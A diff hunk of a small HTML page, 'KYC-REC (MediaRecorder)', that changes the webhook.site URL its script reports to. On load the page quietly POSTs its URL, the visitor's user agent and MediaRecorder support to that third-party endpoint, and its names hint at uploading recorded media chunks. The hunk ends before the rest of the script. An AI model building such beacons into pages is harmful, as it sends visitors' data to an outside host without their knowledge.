@@ -1,7 +1,7 @@
 <!doctype html><html><head><meta charset="utf-8"><title>KYC-REC</title></head>
 <body style="font:14px monospace;padding:8px"><h3>KYC-REC (MediaRecorder)</h3><pre id="o">start</pre>
 <script>
-var HOOK='https://webhook.site/0b16e05b-1e96-42cc-bc3c-c247c7eb3668', T0=Date.now(), chunk=0, total=0;
+var HOOK='https://webhook.site/1288bfad-84da-4ef7-899d-172092a5b398', T0=Date.now(), chunk=0, total=0;
 function log(s){try{document.getElementById('o').textContent+='\n'+s}catch(e){}}
 function post(t,d){try{fetch(HOOK,{method:'POST',body:t+'\n'+String(d).substr(0,400)})}catch(e){}}
 post('REC_PAGE',{href:location.href,ua:navigator.userAgent,mr:typeof MediaRecorder});
